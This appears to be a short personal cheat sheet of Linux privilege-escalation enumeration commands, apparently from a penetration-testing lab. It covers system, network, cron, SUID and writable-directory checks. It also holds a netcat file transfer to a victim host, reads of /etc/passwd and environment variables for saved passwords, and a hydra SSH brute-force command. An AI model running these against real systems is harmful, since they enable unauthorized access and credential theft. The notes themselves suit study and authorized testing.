```SHELL
id
```

```shell
cat /etc/passwd
```

```
hostname
```

```shell
cat /etc/issue

cat /etc/os-release
```

**kernel version and arch**

```shell
uname -a 
```

**process**

```shell
ps aux
```

**network**

```shell
ifconfig
```

```shell
ip a 
```

```shell
route 

or  

routel
```

**socket and active sessions on ports or services running on which ports **

```shell
ss -anp
```

**FIREWALL**

```shell
iptables
```

**FIREWALL CONFIGURATION**

```shell
cd /etc/iptables
ls 
```

**SCHEDULED TASKS**

```SHELL
ls -lah /etc/cron*
```

**current user cron jobs**

```shell
crontab -l 

or 

sudo crontab -l #sudo doenst mean highest priv it just allow us to use sudo on some binary 
```

**INSTALLED APPLICATION**

```SHELL
dpkg -l 
```

**find**

```shell
find / -writable -type d 2>/dev/null
```

**UNMOUNTED DRIVES**

```shell
cat /etc/fstab
```

```shell
lsblk 
```

**drivers and kernel modules**

```shell
lsmod
```

```shell
/sbin/modinfo <MODULE-NAME>
```

**SETUID SETGID**
 
```SHELL
find / -perm -u=s -type f 2>/dev/null
```


### FILE-TRANSFER 

**NETCAT**

```BASH
nc -nvlp <port> > <filename>
```

```shell
nc -nv <victim-ip> <victim-port> < '<file/to/transfer>' 
```

---

**CHECK ENVIRONMENT VARIABLE FOR SAVED PASSWORDS**
```SHELL
env
```

**GENERATING A CUSTOM WORDLIST FOR PRIVESCK**
```SHELL
crunch 6 6 -t Lab%%% > wordlist
```

**BRUTEFORCING SSH FOR HORIZONTAL ESCALATION**
```SHELL
hydra -l eve -P wordlist <ip> -t 4 ssh -V 
```

---

****
